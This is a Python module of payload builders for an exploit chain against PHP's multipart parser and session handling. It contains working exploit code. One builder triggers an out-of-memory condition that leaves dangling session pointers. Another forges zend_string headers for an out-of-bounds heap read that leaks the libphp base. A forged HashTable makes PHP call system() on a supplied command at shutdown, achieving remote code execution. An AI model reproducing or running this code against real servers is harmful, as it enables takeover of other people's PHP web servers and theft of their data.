"""Multipart payload builders for the php2shell exploit chain.

Each builder creates a raw multipart body (without HTTP headers) that triggers
specific behavior in PHP's multipart parser and session handling.

Payload types:
  - A1 (OOM payload): Triggers out-of-memory during END cleanup send_cookie.
    Uses nested empty file fields, filler values, and upload progress to exhaust
    memory during php_url_encode -> php_session_reset_id -> php_session_initialize
    -> php_session_rfc1867_callback. Leaves dangling PS(id)/PS(mod_data) pointers.

  - B1 (Leak payload): Exploits the dangling stale session ID pointer for an
    out-of-bounds read via Set-Cookie. Places a fake zend_string header at the
    stale ID address with a controlled length field, causing php_url_encode to
    read heap memory past the legitimate string boundary.

  - Fake HashTable: Builds a 384-byte forged zend_array whose pDestructor points
    to zif_system. When zend_hash_destroy runs at shutdown, it calls system(cmd).
"""
from __future__ import annotations

import struct

BOUNDARY = b"C" * 10


def _part(name: bytes, value: bytes, boundary: bytes = BOUNDARY,
          filename: bytes | None = None, ctype: bytes | None = None) -> bytes:
    """Build a single multipart form-data part."""
    out = bytearray()
    out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
               name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value + b"\r\n")
    return bytes(out)


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    """Generate a deeply nested field name: files[Rxxxxx...][a][a]...[a]"""
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


# ---------------------------------------------------------------------------
# A1: OOM payload (END-cleanup send_cookie OOM)
# ---------------------------------------------------------------------------

def build_a1_body(parts: int = 860, depth: int = 64, key_pad: int = 90,
                  fillers128: int = 14, big: int = 78, big_len: int = 8000,
                  burners: int = 20, burner_len: int = 4000,
                  progress_len: int = 4000, sid_hex: str = "00",
                  tail: int = 0) -> bytes:
    """Build the A1 OOM multipart body.

    The payload shape exhausts memory_limit during END cleanup:
      1. PHPSESSID field (session intake, no cookie validation)
      2. Deeply nested empty file fields (fill allocator pages)
      3. Filler fields with 103-byte names (bin-128 allocations)
      4. Large value fields (consume remaining pages)
      5. Burner fields (burn through final allocator slack)
      6. PHP_SESSION_UPLOAD_PROGRESS (trigger session lifecycle; the progress
         value length consumes the last available page before url_encode OOM)

    After OOM bailout: PS(send_cookie)=1, PS(id) dangles, PS(mod_data) non-null.
    ZendMM only resets chunk maps; the worker keeps stale pointers in the chunk.
    """
    out = bytearray()

    out.extend(_part(b"PHPSESSID", bytes.fromhex(sid_hex)))

    # Nested empty file fields: each allocates a deeply nested array key chain.
    # Index 0 gets a 103-byte Content-Type (bin-128 zend_string in $_FILES[type]),
    # index 1 gets 231-byte CT (bin-256). The rest have empty filenames.
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = b"C" * 103 if is_mixed else (b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth, key_pad) + b"\"")
        if is_mixed or is_mixed2:
            out.extend(b"; filename=\"A\"")
        else:
            out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")

    # Filler fields: 103-byte names fill bin-128 allocator slots
    for i in range(fillers128):
        out.extend(_part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8))

    # Big values: consume pages (each 8000-byte value takes one page)
    for i in range(big):
        out.extend(_part(("b%04d" % i).encode(), b"B" * big_len))

    # Burner values: burn through remaining allocator slack
    for i in range(burners):
        out.extend(_part(("u%02d" % i).encode(), b"U" * burner_len))

    # Upload progress: triggers session lifecycle; length consumes last page
    out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len))

    # Optional tail fields
    for i in range(tail):
        name = ("t%02d" % i).encode().ljust(35, b"t")[:35]
        out.extend(_part(name, b"T" * 35))

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# ---------------------------------------------------------------------------
# B1: Info leak payload (stale-id OOB read via Set-Cookie)
# ---------------------------------------------------------------------------

def _tag8(idx: int, tagged: bool) -> bytes:
    """Generate an 8-byte tag for identifying forge values in leaked data."""
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int,
                      idx: int = 0, tagged: bool = False) -> bytes:
    """Build a full-chunk fill value with a fake zend_string header.

    The fake header is placed at chunk + page*0x1000. This positions the
    forged string exactly at the stale PS(id) address. The zend_string fields:
      refcount=0 (prevents efree on rshutdown release)
      type=0x16 (IS_STRING|GC_NOT_COLLECTABLE)
      h=0
      len=fake_len (controls how many bytes php_url_encode reads = OOB window)
    """
    length = pages * 4096 - 25
    v = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= length:
        struct.pack_into("<I", v, hdr + 0x00, 0)          # refcount=0 -> no free
        struct.pack_into("<I", v, hdr + 0x04, 0x16)       # IS_STRING|GC_NOT_COLLECTABLE
        struct.pack_into("<Q", v, hdr + 0x08, 0)          # h (hash)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)   # len (OOB read window)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _forge_value(page: int, fake_len: int, idx: int = 0, tagged: bool = False) -> bytes:
    """Build a minimal forge value ending at the fake zend_string header.

    The value data is just long enough to reach page*0x1000 and write the
    forged header there, plus 8 bytes of tag data. First byte is '/' which
    causes php_session_valid_key to fail, preventing the stale session from
    being written to disk (safety measure: the abort path closes a fresh,
    valid ps_files instead of the stale one).
    """
    hdr = page * 0x1000 - 0x1018
    tail = 8
    length = hdr + 0x18 + tail
    v = bytearray(b"A" * length)
    struct.pack_into("<I", v, hdr + 0x00, 0)
    struct.pack_into("<I", v, hdr + 0x04, 0x16)
    struct.pack_into("<Q", v, hdr + 0x08, 0)
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)
    v[hdr + 0x18:hdr + 0x18 + tail] = _tag8(idx, tagged)[:tail]
    return bytes(v)


def build_b1_body(spec: str, sid: str = "a", progress: str = "k0",
                  name_len: int = 120, fake_len: int = 0xC8000,
                  tagged: bool = True) -> bytes:
    """Build the B1 info-leak multipart body.

    The field spec is a comma-separated list of items controlling heap layout:
      G:<pages>:<page> — Full-chunk fill with fake zend_string at <page>.
          Occupies pages 1..<pages>, covering the stale id chunk and
          overwriting basedir's refcount (0x41414141 != 1, preventing
          zend_string_release -> efree -> zend_mm_panic on a FRUN page).
      A:<page> — Minimal forge value ending at the fake header.
      F:<pages> — Plain flood fill (no forge header).
      S:<pages> — Same as F but with 'S' fill byte.
      X:<count> — Nested array fields. Their real HashTable/Bucket chains
          contain pDestructor = zval_ptr_dtor (a libphp pointer), which
          appears in the OOB read window and reveals the libphp base.
      P:<page> — Place the upload progress value to forge at <page>.

    Standard LEAK_SPEC for 128M/8.4.26:
      14x G:511:0x137, 1x G:400:0x137, 1x G:511:0x137, X:900
    This fills 14 full chunks, leaves a 111-page hole (0x191..0x1ff) in
    the 15th chunk for the X fields' HashTables, then reads 800KB.

    The G:400 value creates the hole: only pages 1..400 are filled, leaving
    pages 0x191..0x1ff free. ZendMM's Best-Fit places the X fields' real
    HashTable/Bucket allocations in these holes. Their pDestructor (pointing
    to zval_ptr_dtor in libphp) then appears ~1095 times in the 800KB
    leak window, giving a reliable libphp base address.
    """
    out = bytearray()
    has_p = any(it.partition(":")[0] == "P" for it in spec.replace(",", " ").split())

    out.extend(_part(b"PHPSESSID", sid.encode()))
    if not has_p:
        out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", progress.encode()))

    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            length = pages * 4096 - 25
            v = (b"A" if kind == "F" else b"S") * length
        elif kind == "A":
            page = int(arg, 0)
            v = _forge_value(page, fake_len, idx, tagged)
        elif kind == "X":
            cnt = int(arg, 0)
            for j in range(cnt):
                nm = ("x%05d" % idx).encode() + b"[a]" * 12
                out.extend(_part(nm, b"v"))
                idx += 1
            continue
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill_value(int(pages_s, 0), int(page_s, 0), fake_len, idx, tagged)
        elif kind == "P":
            page = int(arg, 0)
            d = page * 0x1000 - 0x1018
            voff = d - 16
            pv = bytearray(b"K" * (voff + 0x18 + 8))
            struct.pack_into("<I", pv, voff + 0x00, 0)
            struct.pack_into("<I", pv, voff + 0x04, 0x16)
            struct.pack_into("<Q", pv, voff + 0x08, 0)
            struct.pack_into("<Q", pv, voff + 0x10, fake_len)
            pv[voff + 0x18:voff + 0x18 + 8] = b"/99BBBBB"
            out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", bytes(pv)))
            idx += 1
            continue
        else:
            raise ValueError(f"unknown spec item: {item!r}")

        name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
        out.extend(_part(name, v))
        idx += 1

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# ---------------------------------------------------------------------------
# Fake HashTable (pDestructor = zif_system)
# ---------------------------------------------------------------------------

def build_fake_hashtable(htdata_addr: int, zif_addr: int, cmd: bytes,
                         size: int = 384, inband: bool = False) -> bytes:
    """Build a 384-byte forged zend_array whose pDestructor calls system(cmd).

    When inband=False (default, legacy):
      Layout at address S:
        S+0x00: HashTable header (arData at S+0x20, overlaps with execute_data)
        S+0x20: fake execute_data / first Bucket
        S+0x80: command zend_string
      pDestructor fires during RSHUTDOWN. return_value is invalid, worker
      crashes after system() but command has executed.

    When inband=True:
      Layout at address S:
        S+0x00: HashTable header (arData at S+0x40, no overlap)
        S+0x38: index table (8 bytes)
        S+0x40: Bucket[0] / fake execute_data start
        S+0xA0: command zend_string
      pDestructor fires during RSHUTDOWN. return_value points to writable heap
      (htdata_addr+0xF0), preventing crash. HASH_FLAG_UNINITIALIZED prevents
      pefree of fake arData. Worker survives, system() output appears in
      Apache response via sapi_ub_write.
    """
    if not inband:
        return _build_fake_hashtable_legacy(htdata_addr, zif_addr, cmd, size)
    return _build_fake_hashtable_inband(htdata_addr, zif_addr, cmd, size)


def _build_fake_hashtable_legacy(htdata_addr: int, zif_addr: int, cmd: bytes,
                                 size: int = 384) -> bytes:
    """Legacy layout: overlapping arData, worker crashes after RCE."""
    if len(cmd) > size - 0x98 - 1:
        raise ValueError(f"command too long ({len(cmd)} bytes) for {size}-byte carrier")

    ht = bytearray(b"\x00" * size)

    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: refcount=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x20)  # arData -> first Bucket
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed, nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize, nInternalPointer
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif_addr)           # pDestructor = zif_system

    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)              # opline
    struct.pack_into("<Q", ht, E + 0x08, 0)              # call
    struct.pack_into("<Q", ht, E + 0x10, zif_addr)       # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)              # func
    struct.pack_into("<Q", ht, E + 0x20, 0)              # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)              # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)              # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)              # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)              # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata_addr + 0x80)  # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 type = IS_STRING

    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    return bytes(ht)


def _build_fake_hashtable_inband(htdata_addr: int, zif_addr: int, cmd: bytes,
                                 size: int = 384) -> bytes:
    """In-band layout: non-overlapping arData, writable return_value, no crash.

    Key differences from legacy:
      - arData = S+0x40 (after header + index, no overlap with pDestructor)
      - flags include HASH_FLAG_UNINITIALIZED (0x01) to skip pefree
      - return_value = htdata_addr+0xF0 (writable heap, prevents SIGSEGV)
      - val.u1.type_info = 0 (IS_UNDEF) so session serializer skips entry
      - Worker survives RSHUTDOWN; system() output reaches HTTP response
    """
    if len(cmd) > size - 0xB8 - 1:
        raise ValueError(f"command too long ({len(cmd)} bytes) for {size}-byte carrier")

    ht = bytearray(b"\x00" * size)

    # HashTable header at S+0x00 (0x38 bytes)
    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: refcount=1, IS_ARRAY
    # flags = 0x11: HASH_FLAG_UNINITIALIZED(0x01) | HASH_FLAG_STATIC_KEYS(0x10)
    # UNINITIALIZED prevents pefree of fake arData after destruction
    struct.pack_into("<II", ht, 0x08, 0x11, 0xFFFFFFFE)  # flags, nTableMask=-2
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x40)  # arData -> S+0x40
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed=1, nNumOfElements=1
    struct.pack_into("<II", ht, 0x20, 2, 0)              # nTableSize=2, nInternalPointer=0
    struct.pack_into("<Q", ht, 0x28, 0)                  # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif_addr)           # pDestructor = zif_system

    # Index table at S+0x38 (8 bytes, 2 entries for nTableSize=2)
    # Both point to HT_INVALID_IDX (-1) — no hash lookups needed,
    # pDestructor fires via linear iteration in zend_hash_destroy
    struct.pack_into("<II", ht, 0x38, 0xFFFFFFFF, 0xFFFFFFFF)

    # Bucket[0] at S+0x40 — also the start of fake execute_data
    # pDestructor(&bucket->val) = zif_system(&(S+0x40))
    E = 0x40

    # execute_data fields (at S+0x40):
    # +0x00: opline = 0
    struct.pack_into("<Q", ht, E + 0x00, 0)
    # +0x08: call = 0
    struct.pack_into("<Q", ht, E + 0x08, 0)
    # +0x10: return_value = writable heap address (prevents crash!)
    # Using htdata_addr+0xF0 — within our buffer, safely writable
    struct.pack_into("<Q", ht, E + 0x10, htdata_addr + 0xF0)
    # +0x18: func = 0 (not accessed in success path of ZEND_PARSE_PARAMETERS)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    # +0x20: This.value = 0
    struct.pack_into("<Q", ht, E + 0x20, 0)
    # +0x28: This.u1.type_info (call_info) = 0
    struct.pack_into("<I", ht, E + 0x28, 0)
    # +0x2C: num_args = 1
    struct.pack_into("<I", ht, E + 0x2C, 1)
    # +0x30: prev_execute_data = 0
    struct.pack_into("<Q", ht, E + 0x30, 0)
    # +0x38: symbol_table = 0
    struct.pack_into("<Q", ht, E + 0x38, 0)
    # +0x40: run_time_cache = 0
    struct.pack_into("<Q", ht, E + 0x40, 0)
    # +0x48: extra = 0
    struct.pack_into("<Q", ht, E + 0x48, 0)

    # arg1 zval at execute_data+0x50 = S+0x90
    struct.pack_into("<Q", ht, E + 0x50, htdata_addr + 0xA0)  # arg1 value -> cmd string
    struct.pack_into("<I", ht, E + 0x58, 6)                   # arg1 type = IS_STRING

    # Command zend_string at S+0xA0
    struct.pack_into("<II", ht, 0xA0, 1, 0x106)          # gc: refcount=1, IS_STRING
    struct.pack_into("<Q", ht, 0xA8, 0)                  # h (hash)
    struct.pack_into("<Q", ht, 0xB0, len(cmd))           # len
    ht[0xB8:0xB8 + len(cmd)] = cmd
    ht[0xB8 + len(cmd)] = 0                              # null terminator

    return bytes(ht)


# ---------------------------------------------------------------------------
# Standard LEAK_SPEC for the 128M layout
# ---------------------------------------------------------------------------

LEAK_SPEC_128M = ",".join(
    ["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]
)

QUERY_STRING_128M = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
